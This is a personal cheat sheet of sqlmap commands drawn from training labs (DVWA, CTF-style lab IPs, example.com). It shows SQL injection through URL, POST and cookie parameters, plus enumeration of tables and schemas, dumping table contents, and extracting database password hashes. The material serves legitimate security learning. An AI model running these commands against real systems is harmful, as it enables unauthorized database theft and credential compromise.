---
{"dg-publish":true,"permalink":"/sqlmap-examples/"}
---

	```bash
sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id='+OR+'q1'+=+'2&Submit=Submit" --cookie "PHPSSID=712ol0bcaomgr09uvtgu16p7mr" 
```

```bash
sqlmap --parse-errors --batch -u http://94.237.59.174:40519/case1.php?id=1
```

## Working on [[burpsuite\|burpsuite]] output

```shell-session
sqlmap -r req.txt
```

## [[HTTP POST Method\|POST]] Data

```bash
sqlmap --parse-errors --batch -u http://94.237.54.192:48599/case2.php --data 'id=*'
```

## Working on [[curl\|curl]] outputs

```bash
curl 'http://94.237.59.174:40519/case3.php' -b 'id=2'
```

```bash
sqlmap --parse-errors --batch -u 'http://94.237.54.192:48599/case3.php' --cookie 'id=*'
```
## Prefix

```
sqlmap --parse-errors --batch -u "http://83.136.253.201:56959/case6.php?col=*"  --dump -T flag6 -D testdb --no-cast --level=5 --risk=3 --prefix=
'`)'
```


## Table Enumuration

View tables in a database `testdb`
```shell-session
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```


## [[sqlmap - data enumuration\|sqlmap - data enumuration]]



```shell-session
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```


## Dump table content

Dump content from table `users`
```shell-session
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```

```shell-session
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```
### Columns

```shell-session
torsho@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```


Only columns 2, 3

```shell-session
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

## Conditional Enumuration

```shell-session
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```


## Get Schema of Database

```shell-session
sqlmap -u "http://www.example.com/?id=1" --schema
```


## Search for schema

```shell-session
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

```
sqlmap --batch -r case1.req.txt --dbms=MySQL --search -C style
```

## Get passwords

```shell-session
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```